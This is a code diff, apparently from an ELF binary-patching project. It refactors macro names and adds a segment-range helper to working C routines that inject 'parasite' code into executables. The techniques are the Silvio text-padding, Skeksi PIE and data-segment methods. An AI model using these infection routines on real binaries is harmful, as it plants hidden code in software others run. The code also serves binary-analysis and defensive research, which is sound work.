@@ -30,7 +30,82 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 #include <elf.h>
-#include "common.h"
+#include <stdlib.h>
+#include <unistd.h>
+#include "lib/util.h"
+
+int MODE = ELFCLASS64;
+
+/**
+ * @brief 得到段的映射地址范围
+ * Obtain the mapping address range of the segment
+ * @param elf_name 
+ * @param type segment type
+ * @param start output args
+ * @param end output args
+ * @return int error code {-1:error,0:sucess}
+ */
+int get_segment_range(char *elf_name, int type, uint64_t *start, uint64_t *end) {
+    int fd;
+    struct stat st;
+    uint8_t *elf_map;
+    uint64_t low = 0xffffffff;
+    uint64_t high = 0;
+
+    fd = open(elf_name, O_RDONLY);
+    if (fd < 0) {
+        perror("open");
+        return -1;
+    }
+
+    if (fstat(fd, &st) < 0) {
+        perror("fstat");
+        return -1;
+    }
+
+    elf_map = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+    if (elf_map == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+
+    if (MODE == ELFCLASS32) {
+        Elf32_Ehdr *ehdr = (Elf32_Ehdr *)elf_map;
+        Elf32_Phdr *phdr = (Elf32_Phdr *)&elf_map[ehdr->e_phoff];
+        // 计算地址的最大值和最小值
+        // calculate the maximum and minimum values of the virtual address
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_type == type) {
+                if (phdr[i].p_vaddr < low)
+                    low = phdr[i].p_vaddr;
+                if (phdr[i].p_vaddr + phdr[i].p_memsz > high)
+                    high = phdr[i].p_vaddr + phdr[i].p_memsz;
+            }
+        }
+    }
+
+    if (MODE == ELFCLASS64) {
+        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_map;
+        Elf64_Phdr *phdr = (Elf64_Phdr *)&elf_map[ehdr->e_phoff];
+        // 计算地址的最大值和最小值
+        // calculate the maximum and minimum values of the virtual address
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_type == type) {
+                if (phdr[i].p_vaddr < low)
+                    low = phdr[i].p_vaddr;
+                if (phdr[i].p_vaddr + phdr[i].p_memsz > high)
+                    high = phdr[i].p_vaddr + phdr[i].p_memsz;
+            }
+        }
+    }
+
+    *start = low;
+    *end = high; 
+
+    close(fd);
+    munmap(elf_map, st.st_size);
+    return 0;
+}
 
 /**
  * @brief 在文件offset偏移处插入一段数据
@@ -87,7 +162,7 @@ int insert_data(const char *filename, off_t offset, const void *data, size_t dat
   │   │              │               │       │      │        
   │   │              │               │       │      │        
   ▼   │              │               │       ▼      │        
-  ─── │              │               │   PAGE_SIZE  │        
+  ─── │              │               │   ONE_PAGE  │        
       │              │               │              │        
       └──────────────┘               ├──────────────┤        
                                      │     shdr     │        
@@ -144,7 +219,7 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
                     parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
                     phdr[i].p_memsz += size;
                     phdr[i].p_filesz += size;
-                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
+                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                     break;
                 }
             }
@@ -154,9 +229,9 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
             if (phdr[i].p_type == PT_LOAD) {
                 // 2. 其他load段向后偏移
                 if (phdr[i].p_offset > phdr[text_index].p_offset) {
-                    //phdr[i].p_vaddr += PAGE_SIZE;
-                    //phdr[i].p_paddr += PAGE_SIZE;
-                    phdr[i].p_offset += PAGE_SIZE;
+                    //phdr[i].p_vaddr += ONE_PAGE;
+                    //phdr[i].p_paddr += ONE_PAGE;
+                    phdr[i].p_offset += ONE_PAGE;
                 }
             }
         }
@@ -164,8 +239,8 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
         for (int i = 0; i < ehdr->e_shnum; i++) {
             // 3. 寄生代码之后的节，偏移PAGE_SIZE
             if (shdr[i].sh_offset > parasite_offset) {
-                //shdr[i].sh_addr += PAGE_SIZE;
-                shdr[i].sh_offset += PAGE_SIZE;
+                //shdr[i].sh_addr += ONE_PAGE;
+                shdr[i].sh_offset += ONE_PAGE;
             }
             // 4. text节，偏移size
             else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_addr) {
@@ -173,7 +248,7 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
             }
         }
         // 5. elf节头偏移PAGE_SIZE
-        ehdr->e_shoff += PAGE_SIZE;
+        ehdr->e_shoff += ONE_PAGE;
     }
 
     else if (MODE == ELFCLASS64) {
@@ -192,7 +267,7 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
                     parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
                     phdr[i].p_memsz += size;
                     phdr[i].p_filesz += size;
-                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
+                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                     break;
                 }
             }
@@ -202,7 +277,7 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
             if (phdr[i].p_type == PT_LOAD) {
                 // 2. 其他load段向后偏移
                 if (phdr[i].p_offset > phdr[text_index].p_offset) {
-                    phdr[i].p_offset += PAGE_SIZE;
+                    phdr[i].p_offset += ONE_PAGE;
                 }
             }
         }
@@ -210,7 +285,7 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
         for (int i = 0; i < ehdr->e_shnum; i++) {
             // 3. 寄生代码之后的节，偏移PAGE_SIZE
             if (shdr[i].sh_offset > parasite_offset) {
-                shdr[i].sh_offset += PAGE_SIZE;
+                shdr[i].sh_offset += ONE_PAGE;
             }
             // 4. text节，偏移size
             else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_addr) {
@@ -218,21 +293,21 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
             }
         }
         // 5. elf节头偏移PAGE_SIZE
-        ehdr->e_shoff += PAGE_SIZE;
+        ehdr->e_shoff += ONE_PAGE;
     }
 
     close(fd);
     munmap(mapped, st.st_size);
 
     // 6. 插入寄生代码
-    char *parasite_expand = malloc(PAGE_SIZE);
-    memset(parasite_expand, 0, PAGE_SIZE);
-    memcpy(parasite_expand, parasite, PAGE_SIZE - size > 0? size: PAGE_SIZE);
-    int ret = insert_data(elfname, parasite_offset, parasite_expand, PAGE_SIZE);
+    char *parasite_expand = malloc(ONE_PAGE);
+    memset(parasite_expand, 0, ONE_PAGE);
+    memcpy(parasite_expand, parasite, ONE_PAGE - size > 0? size: ONE_PAGE);
+    int ret = insert_data(elfname, parasite_offset, parasite_expand, ONE_PAGE);
     if (ret == 0) {
-        VERBOSE("insert successfully\n");
+        PRINT_VERBOSE("insert successfully\n");
     } else {
-        VERBOSE("insert failed\n");
+        PRINT_VERBOSE("insert failed\n");
     }
     free(parasite_expand);
 
@@ -325,11 +400,11 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
                     origin_text_vaddr = phdr[i].p_vaddr;
                     origin_text_size = phdr[i].p_memsz;
                     origin_text_offset = phdr[i].p_offset;
-                    phdr[i].p_memsz += PAGE_SIZE;
-                    phdr[i].p_vaddr -= PAGE_SIZE;
-                    phdr[i].p_paddr -= PAGE_SIZE;
+                    phdr[i].p_memsz += ONE_PAGE;
+                    phdr[i].p_vaddr -= ONE_PAGE;
+                    phdr[i].p_paddr -= ONE_PAGE;
                     parasite_addr = phdr[i].p_vaddr;
-                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
+                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                     break;
                 }
             }
@@ -345,20 +420,20 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
             }
 
             // if (phdr[i].p_vaddr > origin_text_vaddr) {
-            //     phdr[i].p_vaddr += PAGE_SIZE;
+            //     phdr[i].p_vaddr += ONE_PAGE;
             // }
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
             if (shdr[i].sh_addr == origin_text_vaddr) {
-                shdr[i].sh_addr -= PAGE_SIZE;
-                shdr[i].sh_size += PAGE_SIZE;
+                shdr[i].sh_addr -= ONE_PAGE;
+                shdr[i].sh_size += ONE_PAGE;
             }
             else if (shdr[i].sh_addr < origin_text_vaddr) {
                 shdr[i].sh_addr += align_to_4k(vend);
             }
             // else if (shdr[i].sh_addr >= origin_text_vaddr + origin_text_size) {
-            //     shdr[i].sh_addr += PAGE_SIZE;
+            //     shdr[i].sh_addr += ONE_PAGE;
             // }
         }
 
@@ -384,22 +459,22 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
         // file layout
         for (int i = 0; i < ehdr->e_phnum; i++) {
             if (i == text_index) {
-                phdr[i].p_filesz += PAGE_SIZE;
+                phdr[i].p_filesz += ONE_PAGE;
                 continue;
             }
             if (phdr[i].p_offset > origin_text_offset) {
-                phdr[i].p_offset += PAGE_SIZE;
+                phdr[i].p_offset += ONE_PAGE;
             }
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
             if (shdr[i].sh_offset >= origin_text_offset + origin_text_size) {
-                shdr[i].sh_offset += PAGE_SIZE;
+                shdr[i].sh_offset += ONE_PAGE;
             }
         }
 
         // elf节头表偏移PAGE_SIZE
-        ehdr->e_shoff += PAGE_SIZE;
+        ehdr->e_shoff += ONE_PAGE;
     }
 
     else if (MODE == ELFCLASS64) {
@@ -423,11 +498,11 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
                     origin_text_vaddr = phdr[i].p_vaddr;
                     origin_text_size = phdr[i].p_memsz;
                     origin_text_offset = phdr[i].p_offset;
-                    phdr[i].p_memsz += PAGE_SIZE;
-                    phdr[i].p_vaddr -= PAGE_SIZE;
-                    phdr[i].p_paddr -= PAGE_SIZE;
+                    phdr[i].p_memsz += ONE_PAGE;
+                    phdr[i].p_vaddr -= ONE_PAGE;
+                    phdr[i].p_paddr -= ONE_PAGE;
                     parasite_addr = phdr[i].p_vaddr;
-                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
+                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                     break;
                 }
             }
@@ -445,8 +520,8 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
             if (shdr[i].sh_addr == origin_text_vaddr) {
-                shdr[i].sh_addr -= PAGE_SIZE;
-                shdr[i].sh_size += PAGE_SIZE;
+                shdr[i].sh_addr -= ONE_PAGE;
+                shdr[i].sh_size += ONE_PAGE;
             }
             else if (shdr[i].sh_addr < origin_text_vaddr) {
                 shdr[i].sh_addr += align_to_4k(vend);
@@ -475,36 +550,36 @@ uint64_t infect_skeksi_pie(char *elfname, char *parasite, size_t size) {
         // file layout
         for (int i = 0; i < ehdr->e_phnum; i++) {
             if (i == text_index) {
-                phdr[i].p_filesz += PAGE_SIZE;
+                phdr[i].p_filesz += ONE_PAGE;
                 continue;
             }
             if (phdr[i].p_offset > origin_text_offset) {
-                phdr[i].p_offset += PAGE_SIZE;
+                phdr[i].p_offset += ONE_PAGE;
             }
         }
 
         for (int i = 0; i < ehdr->e_shnum; i++) {
             if (shdr[i].sh_offset >= origin_text_offset + origin_text_size) {
-                shdr[i].sh_offset += PAGE_SIZE;
+                shdr[i].sh_offset += ONE_PAGE;
             }
         }
 
         // elf节头表偏移PAGE_SIZE
-        ehdr->e_shoff += PAGE_SIZE;
+        ehdr->e_shoff += ONE_PAGE;
     }
 
     close(fd);
     munmap(mapped, st.st_size);
 
     // insert parasite code
-    char *parasite_expand = malloc(PAGE_SIZE);
-    memset(parasite_expand, 0, PAGE_SIZE);
-    memcpy(parasite_expand, parasite, PAGE_SIZE - size > 0? size: PAGE_SIZE);
-    int ret = insert_data(elfname, origin_text_offset, parasite_expand, PAGE_SIZE);
+    char *parasite_expand = malloc(ONE_PAGE);
+    memset(parasite_expand, 0, ONE_PAGE);
+    memcpy(parasite_expand, parasite, ONE_PAGE - size > 0? size: ONE_PAGE);
+    int ret = insert_data(elfname, origin_text_offset, parasite_expand, ONE_PAGE);
     if (ret == 0) {
-        VERBOSE("insert successfully\n");
+        PRINT_VERBOSE("insert successfully\n");
     } else {
-        VERBOSE("insert failed\n");
+        PRINT_VERBOSE("insert failed\n");
     }
     free(parasite_expand);
 
@@ -584,7 +659,7 @@ uint64_t infect_data(char *elfname, char *parasite, size_t size) {
                 phdr[i].p_memsz += size;
                 phdr[i].p_filesz += size;
                 phdr[i].p_flags |= PF_X;
-                VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
+                PRINT_VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
                 break;
             }
         }
@@ -615,7 +690,7 @@ uint64_t infect_data(char *elfname, char *parasite, size_t size) {
                 phdr[i].p_memsz += size;
                 phdr[i].p_filesz += size;
                 phdr[i].p_flags |= PF_X;
-                VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
+                PRINT_VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
                 break;
             }
         }
@@ -637,9 +712,9 @@ uint64_t infect_data(char *elfname, char *parasite, size_t size) {
     // insert parasite code
     int ret = insert_data(elfname, origin_data_offset, parasite, size);
     if (ret == 0) {
-        VERBOSE("insert successfully\n");
+        PRINT_VERBOSE("insert successfully\n");
     } else {
-        VERBOSE("insert failed\n");
+        PRINT_VERBOSE("insert failed\n");
     }
 
     return vend;
